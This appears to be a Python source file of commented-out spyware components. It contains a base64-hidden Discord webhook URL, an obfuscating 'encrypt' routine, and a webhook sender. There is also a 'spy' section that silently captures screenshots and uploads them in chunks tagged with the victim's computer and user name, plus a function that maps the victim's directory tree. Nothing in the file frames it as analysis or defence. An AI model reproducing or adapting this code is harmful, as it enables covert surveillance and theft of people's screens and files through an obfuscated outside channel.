# WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1OTQ1ODQ1MTA2NTkyOTc1MS9qQlZxRmJZdW9ya3M2VVY3aE03MzZ3SFduSTB1OEk5c1NfM2RZVGdMV3g5bVZwZnVVS0hHRzFkZVlUZ0hvazJLazVqdQ=="


# old send_webhook

# def send_webhook(message):
#     webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")

#     payload = json.dumps({
#         "content": encrypt(message)
#     }).encode("utf-8")

#     req = urllib.request.Request(
#         webhook_url,
#         data=payload,
#         method="POST",
#         headers={
#             "Content-Type": "application/json",
#             "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
#         }
#     )

#     try:
#         with urllib.request.urlopen(req, timeout=10) as response:
#             response.read()
#         return True
#     except Exception as e:
#         return False


# old encrypt

# def encrypt(text: str) -> str:
#     b64 = base64.b64encode(text.encode()).decode()

#     lower = string.ascii_lowercase
#     upper = string.ascii_uppercase

#     lower_rot = lower[5:] + lower[:5]
#     upper_rot = upper[-3:] + upper[:-3]

#     table = str.maketrans(
#         lower + upper,
#         lower_rot + upper_rot
#     )

#     encrypted = b64.translate(table)
#     encrypted = encrypted.replace("==","-°").replace("=","_")

#     return encrypted






# spy

# def custom_encode(image_path):
#     with open(image_path, "rb") as f:
#         d = encrypt(f.read(),byte=True)
    
#     new_image_path = image_path[:-3] + "enc"
#     with open(new_image_path, "w", encoding="utf-8") as f:
#         f.write(d)

#     return new_image_path

# def send_file_in_chunks(file_path, original_file_name):
#     file_size = os.path.getsize(file_path)
#     filename = original_file_name
    
#     webhook_url = base64.b64decode(FILE_WEBHOOK_B64).decode("utf-8")

#     transfer_id = uuid.uuid4().hex  # unique ID for rebuilding

#     if file_size <= MAX_FILE_SIZE:
#         with open(file_path, 'rb') as f:
#             payload = {
#                 "id": transfer_id,
#                 "filename": filename,
#                 "chunk_number": 1,
#                 "total_chunks": 1,
#                 'computer':COMPUTER_NAME,
#                 'username':USER_NAME
#             }
#             requests.post(
#                 webhook_url,
#                 data={"content": encrypt(json.dumps(payload))},
#                 files={"file": f}
#             )
#     else:
#         total_chunks = math.ceil(file_size / MAX_FILE_SIZE)

#         with open(file_path, 'rb') as f:
#             chunk_num = 1
#             while chunk := f.read(MAX_FILE_SIZE):
#                 chunk_file = tempfile.NamedTemporaryFile(delete=False, suffix=".chunk")
#                 chunk_file.write(chunk)
#                 chunk_file.close()

#                 payload = {
#                     "id": transfer_id,
#                     "filename": filename,
#                     "chunk_number": chunk_num,
#                     "total_chunks": total_chunks,
#                     'computer':COMPUTER_NAME,
#                     'username':USER_NAME
#                 }

#                 with open(chunk_file.name, 'rb') as cf:
#                     requests.post(
#                         webhook_url,
#                         data={"content": encrypt(json.dumps(payload))},
#                         files={"file": cf}
#                     )

#                 os.remove(chunk_file.name)
#                 chunk_num += 1

# def take_screenshot():
#     temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
#     temp_file.close()
    
#     try:
#         # Take a screenshot
#         screenshot = pyautogui.screenshot()
#         screenshot.save(temp_file.name)
        
#         # Encode the image
#         encoded_file = custom_encode(temp_file.name)
        
#         # Send via webhook
#         send_file_in_chunks(encoded_file, "screenshot.png")
#     finally:
#         # Ensure files are deleted
#         if os.path.exists(temp_file.name):
#             os.remove(temp_file.name)
#         if encoded_file != temp_file.name and os.path.exists(encoded_file):
#             os.remove(encoded_file)





# dir

# def build_directory_tree(path, ignore_names=None, max_depth=None, current_depth=1):
#     """
#     Recursively builds a dictionary that represents the folder structure.

#     - ignore_names: set/list of folder names to completely skip
#     - max_depth: maximum depth to explore (None = infinite)
#     - current_depth: internal use for recursion
#     """
#     if ignore_names is None:
#         ignore_names = set()
#     else:
#         ignore_names = set(ignore_names)

#     tree = {}

#     # Stop if max depth reached
#     if max_depth is not None and current_depth > max_depth:
#         return tree

#     try:
#         for entry in os.listdir(path):
#             if entry in ignore_names:
#                 continue

#             full_path = os.path.join(path, entry)

#             if os.path.isdir(full_path):
#                 # If we're at max depth, don't go deeper
#                 if max_depth is not None and current_depth == max_depth:
#                     tree[entry] = {}
#                 else:
#                     tree[entry] = build_directory_tree(
#                         full_path,
#                         ignore_names,
#                         max_depth,
#                         current_depth + 1
#                     )
#             else:
#                 tree[entry] = None

#     except PermissionError:
#         tree["__error__"] = "Permission denied"

#     return tree


# def get_directory_architecture(root_path, ignore_names=None, max_depth=None):
#     root_name = os.path.basename(os.path.abspath(root_path))
#     return {
#         root_name: build_directory_tree(
#             root_path,
#             ignore_names=ignore_names,
#             max_depth=max_depth,
#             current_depth=1
#         )
#     }
